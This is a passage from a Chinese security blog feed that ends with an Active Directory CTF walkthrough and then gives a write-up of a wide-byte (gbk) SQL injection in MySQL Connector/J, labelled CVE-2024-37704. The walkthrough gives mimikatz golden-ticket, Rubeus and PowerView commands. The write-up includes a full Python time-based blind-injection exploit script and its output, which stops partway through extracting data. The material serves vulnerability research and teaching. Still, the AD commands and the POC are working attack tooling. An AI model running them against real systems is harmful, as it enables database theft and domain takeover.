属性中：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msDS-RevealOnDemandGroup'</span>=@<span class="token punctuation">(</span><span class="token string">'CN=Administrator,CN=Users,DC=vertex,DC=local'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>完成黄金票据构造：</p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe kerberos::golden /admin:Administrator /domain:vertexsoft.local /sid:S-1-5-21-1670446094-1728415802-1380520873 /krbtgt:34e335179246ef930dc33fd1e3de6e9e /ticket:ticket.kirbi</code></pre><p><img src="image-8.png" alt="alt text"></p><p>发起 Key List Request：</p><pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertex.local /dc:DC.vertex.local /ticket:base64</code></pre><p>最后通过哈希传递获得 DC 权限拿到 flag</p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-37704 MySQL-Connector-Java SQL注入漏洞分析</title>
      <link href="/skill/cve-2024-37704-mysql-connector-java-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/skill/cve-2024-37704-mysql-connector-java-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>产品：MySQL Connector Java 8.0.x<br><a href="https://github.com/mysql/mysql-connector-j">https://github.com/mysql/mysql-connector-j</a><br><a href="https://mvnrepository.com/artifact/mysql/mysql-connector-java">https://mvnrepository.com/artifact/mysql/mysql-connector-java</a><br><a href="https://dev.mysql.com/doc/connector-j">https://dev.mysql.com/doc/connector-j</a></p><p>截止本文发布时产品的最新版本为：8.0.33，已验证存在漏洞并可被有效利用</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>使用 prepareStatement 预编译 SQL 语句存储二进制数据</li><li>数据库使用宽字节编码（gbk 等编码）存储数据</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>引入漏洞影响范围内的 MySQL Connector Java 依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.0.33<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>创建宽字节编码数据库</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> <span class="token keyword">user</span><span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> gbk <span class="token keyword">COLLATE</span> gbk_chinese_ci<span class="token punctuation">;</span><span class="token keyword">USE</span> <span class="token keyword">user</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> avatars <span class="token punctuation">(</span>    user_id <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    avatar_data <span class="token keyword">LONGBLOB</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> gbk <span class="token keyword">COLLATE</span> gbk_chinese_ci<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> flag <span class="token punctuation">(</span>    flag <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> flag <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'flag&#123;test_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>创建 prepareStatement 预编译 SQL 语句存储二进制数据接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">storeAvatar</span><span class="token punctuation">(</span><span class="token class-name">String</span> userId<span class="token punctuation">,</span> <span class="token class-name">MultipartFile</span> avatarFile<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"INSERT INTO avatars (user_id, avatar_data) VALUES (?, ?)"</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Connection</span> conn <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PreparedStatement</span> ps <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ps<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>        ps<span class="token punctuation">.</span><span class="token function">setBlob</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> avatarFile<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ps.setBinaryStream(2, avatarFile.getInputStream()); // also vulnerable</span>        ps<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>使用二进制编辑工具构造如下二进制文件并传入上述接口：</p><p><img src="image-1.png" alt="alt text"></p><p>服务端控制台输出：</p><p><img src="image-2.png" alt="alt text"></p><p>表明 SQL 注入漏洞存在并被成功利用</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>调用栈：</p><pre class="language-none"><code class="language-none">escapeblockFast:140, InputStreamValueEncoder (com.mysql.cj.protocol.a)streamToBytes:102, InputStreamValueEncoder (com.mysql.cj.protocol.a)encodeAsText:63, InputStreamValueEncoder (com.mysql.cj.protocol.a)writeAsText:383, NativeQueryBindValue (com.mysql.cj)buildComQuery:175, NativeMessageBuilder (com.mysql.cj.protocol.a)buildComQuery:51, NativeMessageBuilder (com.mysql.cj.protocol.a)fillSendPacket:222, ClientPreparedQuery (com.mysql.cj)execute:330, ClientPreparedStatement (com.mysql.cj.jdbc)execute:44, ProxyPreparedStatement (com.zaxxer.hikari.pool)execute:-1, HikariProxyPreparedStatement (com.zaxxer.hikari.pool)</code></pre><p>在客户端将数据提交至接口，并在服务端下断点跟进 <code>ps.execute()</code>：</p><p><img src="image-3.png" alt="alt text"></p><p><code>HikariProxyPreparedStatement.execute()</code>：</p><p><img src="image-4.png" alt="alt text"></p><p>调用父类 <code>execute()</code>，通过 <code>ProxyPreparedStatement</code> 转发执行请求：</p><p><img src="image-5.png" alt="alt text"></p><p>调用 <code>ClientPreparedStatement.execute()</code>，直接处理执行请求：</p><p><img src="image-6.png" alt="alt text"></p><p>调用 <code>ClientPreparedQuery.fillSendPacket()</code>，将传入接口的数据填充进数据包 Packet：</p><p><img src="image-7.png" alt="alt text"></p><p>调用 <code>NativeMessageBuilder.buildComQuery()</code>，构建和生成 Query 语句：</p><p><img src="image-8.png" alt="alt text"></p><p>调用 <code>NativeQueryBindValue.writeAsText()</code>，将绑定的值以文本格式填入 Query 语句：</p><p><img src="image-9.png" alt="alt text"></p><p>调用 <code>InputStreamValueEncoder.encodeAsText()</code>，将绑定的值转换为文本格式：</p><p><img src="image-10.png" alt="alt text"></p><p>调用 <code>InputStreamValueEncoder.streamToBytes()</code>，读取输入流中的数据并转换为字节序列：</p><p><img src="image-11.png" alt="alt text"></p><p>调用 <code>InputStreamValueEncoder.escapeblockFast()</code> 方法在发送前对数据流中的特殊字符进行转义</p><p>此处即为导致该漏洞的主要方法：<br><code>com.mysql.cj.protocol.a.InputStreamValueEncoder#escapeblockFast</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">escapeblockFast</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf<span class="token punctuation">,</span> <span class="token class-name">NativePacketPayload</span> packet<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> lastwritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span> b <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// write stuff not yet written</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> lastwritten<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                packet<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token class-name">StringLengthDataType</span><span class="token punctuation">.</span><span class="token constant">STRING_FIXED</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> lastwritten<span class="token punctuation">,</span> i <span class="token operator">-</span> lastwritten<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// write escape</span>            packet<span class="token punctuation">.</span><span class="token function">writeInteger</span><span class="token punctuation">(</span><span class="token class-name">IntegerDataType</span><span class="token punctuation">.</span><span class="token constant">INT1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token char">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            packet<span class="token punctuation">.</span><span class="token function">writeInteger</span><span class="token punctuation">(</span><span class="token class-name">IntegerDataType</span><span class="token punctuation">.</span><span class="token constant">INT1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lastwritten <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token char">'\''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// write stuff not yet written</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> lastwritten<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    packet<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token class-name">StringLengthDataType</span><span class="token punctuation">.</span><span class="token constant">STRING_FIXED</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> lastwritten<span class="token punctuation">,</span> i <span class="token operator">-</span> lastwritten<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// write escape</span>                packet<span class="token punctuation">.</span><span class="token function">writeInteger</span><span class="token punctuation">(</span><span class="token class-name">IntegerDataType</span><span class="token punctuation">.</span><span class="token constant">INT1</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>                lastwritten <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// not i+1 as b wasn't written.</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write out remaining stuff from buffer</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastwritten <span class="token operator">&lt;</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        packet<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token class-name">StringLengthDataType</span><span class="token punctuation">.</span><span class="token constant">STRING_FIXED</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> lastwritten<span class="token punctuation">,</span> size <span class="token operator">-</span> lastwritten<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在分析这段 Java 代码时，我们关注的是字符 <code>\</code>（16进制 ASCII：5C）和 <code>&#39;</code>（16进制 ASCII：27）的特殊处理逻辑。这段代码设计用于处理字符串中需要转义的特定字符，确保这些字符在数据处理或传输时不会引起错误或安全问题</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token char">'\''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// write stuff not yet written</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> lastwritten<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        packet<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token class-name">StringLengthDataType</span><span class="token punctuation">.</span><span class="token constant">STRING_FIXED</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> lastwritten<span class="token punctuation">,</span> i <span class="token operator">-</span> lastwritten<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write escape</span>    packet<span class="token punctuation">.</span><span class="token function">writeInteger</span><span class="token punctuation">(</span><span class="token class-name">IntegerDataType</span><span class="token punctuation">.</span><span class="token constant">INT1</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    lastwritten <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// not i+1 as b wasn't written.</span><span class="token punctuation">&#125;</span></code></pre><p>这里，<code>packet.writeInteger()</code> 的调用指定以一个字节的形式写入整数值 b，这里的 b 就是字符的 ASCII 值。对于 <code>\</code> 和 <code>&#39;</code>，分别写入 5C 和 27</p><p>而这里 lastwritten 更新为 i 而非 i+1 是因为尽管字符 b 已被处理（转义），但实际上它未被写入为原始字符，而是作为转义字符，在读取下一个字符时，字符 b 会被再次写入</p><p>这段代码在执行时，实际上复写了字符 <code>\</code> 和 <code>&#39;</code>，对于漏洞验证中的 Payload 前缀：<code>DE 5C 27 29</code>，在经过该方法转义后会复写 5C 和 27 字符，形成 <code>DE 5C 5C 27 27 29</code> 字节序列</p><p>而在例如 gbk 等宽字节编码中 <code>DE 5C</code> 会被作为一个整体解析为一个字符，最终剩下的 <code>5C 27 27 29</code> 则成为 <code>\&#39;&#39;)</code>，形成了可被用于逃逸的引号，最终造成 SQL 注入的漏洞</p><p><img src="image-12.png" alt="alt text"></p><p>从服务端的调试视图中可以发现，包含恶意 SQL 语句的 Payload 已被成功构造进入数据包 packet 中</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在真实环境下，由于获取不到服务端控制台输出，该漏洞可与 SQL 盲注搭配使用来形成有效攻击载荷，完成对目标数据库敏感信息的信息泄露</p><p>POC：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> argparseparser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"CVE-2024-37704 SQL Injection Exploit Script"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'The target URL'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> args<span class="token punctuation">.</span>urlurl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">api/avatar/upload"</span></span>userid <span class="token operator">=</span> <span class="token number">1</span>payload_len <span class="token operator">=</span> <span class="token string">"轡');select 1 and if((length((&#123;data&#125;))=&#123;n&#125;),sleep(5),3);#"</span>payload_str <span class="token operator">=</span> <span class="token string">"轡');select 1 and if((ascii(substr((&#123;data&#125;),&#123;n&#125;,1))=&#123;r&#125;),sleep(5),3);#"</span><span class="token keyword">def</span> <span class="token function">to_ascii</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    ascii_values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>character<span class="token punctuation">:</span><span class="token format-spec">02X</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> character <span class="token keyword">in</span> text<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ascii_values<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_request</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>payload<span class="token punctuation">)</span>    <span class="token keyword">return</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token comment"># 测试宽字节</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------测试宽字节-----------------"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>to_ascii<span class="token punctuation">(</span>payload_len<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>to_ascii<span class="token punctuation">(</span>payload_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span>data_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">global</span> userid    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'userId'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'avatarFile'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'test.png'</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token operator">=</span>data_str<span class="token punctuation">,</span> n<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        use_time <span class="token operator">=</span> send_request<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        userid <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> use_time <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'测试长度完成，长度为：'</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>            <span class="token keyword">return</span> length        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在测试长度：'</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>            length <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">get_string</span><span class="token punctuation">(</span>data_str<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">global</span> userid    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">'userId'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 <span class="token string">'avatarFile'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'test.png'</span><span class="token punctuation">,</span> payload_str<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token operator">=</span>data_str<span class="token punctuation">,</span> n<span class="token operator">=</span>l<span class="token punctuation">,</span> r<span class="token operator">=</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            use_time <span class="token operator">=</span> send_request<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            userid <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> use_time <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>                string <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'第'</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token string">'个字符猜解成功：'</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> string<span class="token comment"># 获取数据库名</span>data_str <span class="token operator">=</span> <span class="token string">"database()"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取数据库名长度-----------------"</span><span class="token punctuation">)</span>database_length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>data_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取数据库名-----------------"</span><span class="token punctuation">)</span>database_name <span class="token operator">=</span> get_string<span class="token punctuation">(</span>data_str<span class="token punctuation">,</span> database_length<span class="token punctuation">)</span><span class="token comment"># 获取数据表名</span>data_str <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select table_name from information_schema.tables where table_schema=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>database_name<span class="token punctuation">&#125;</span></span><span class="token string">\" limit 1,1"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取数据表名长度-----------------"</span><span class="token punctuation">)</span>table_length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>data_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取数据表名-----------------"</span><span class="token punctuation">)</span>table_name <span class="token operator">=</span> get_string<span class="token punctuation">(</span>data_str<span class="token punctuation">,</span> table_length<span class="token punctuation">)</span><span class="token comment"># 获取字段名</span>data_str <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select column_name from information_schema.columns where table_schema=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>database_name<span class="token punctuation">&#125;</span></span><span class="token string">\" and table_name=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">\" limit 0,1"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取字段名长度-----------------"</span><span class="token punctuation">)</span>column_length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>data_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取字段名-----------------"</span><span class="token punctuation">)</span>column_name <span class="token operator">=</span> get_string<span class="token punctuation">(</span>data_str<span class="token punctuation">,</span> column_length<span class="token punctuation">)</span><span class="token comment"># 获取字段值</span>data_str <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取字段值长度-----------------"</span><span class="token punctuation">)</span>column_value_length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>data_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------获取字段值-----------------"</span><span class="token punctuation">)</span>column_value <span class="token operator">=</span> get_string<span class="token punctuation">(</span>data_str<span class="token punctuation">,</span> column_value_length<span class="token punctuation">)</span></code></pre><p>可以看到，在运行 POC 脚本后，成功获取到了目标服务器数据库中的 flag 信息：</p><pre class="language-none"><code class="language-none">-----------------测试宽字节-----------------DE 5C 27 29 3B 73 65 6C 65 63 74 20 31 20 61 6E 64 20 69 66 28 28 6C 65 6E 67 74 68 28 28 7B 64 61 74 61 7D 29 29 3D 7B 6E 7D 29 2C 73 6C 65 65 70 28 35 29 2C 33 29 3B 23DE 5C 27 29 3B 73 65 6C 65 63 74 20 31 20 61 6E 64 20 69 66 28 28 61 73 63 69 69 28 73 75 62 73 74 72 28 28 7B 64 61 74 61 7D 29 2C 7B 6E 7D 2C 31 29 29 3D 7B 72 7D 29 2C 73 6C 65 65 70 28 35 29 2C 33 29 3B 23-----------------获取数据库名长度-----------------正在测试长度： 1正在测试长度： 2正在测试长度： 3测试长度完成，长度为： 4-----------------获取数据库名-----------------第 1 个字符猜解成功： u第 2 个字符猜解成功： us第 3 个字符猜解成功： use第 4 个字符猜解成功： user-----------------获取数据表名长度-----------------正在测试长度： 1正在测试长度： 2正在测试长度： 3测试长度完成，长度为： 4-----------------获取数据表名-----------------第 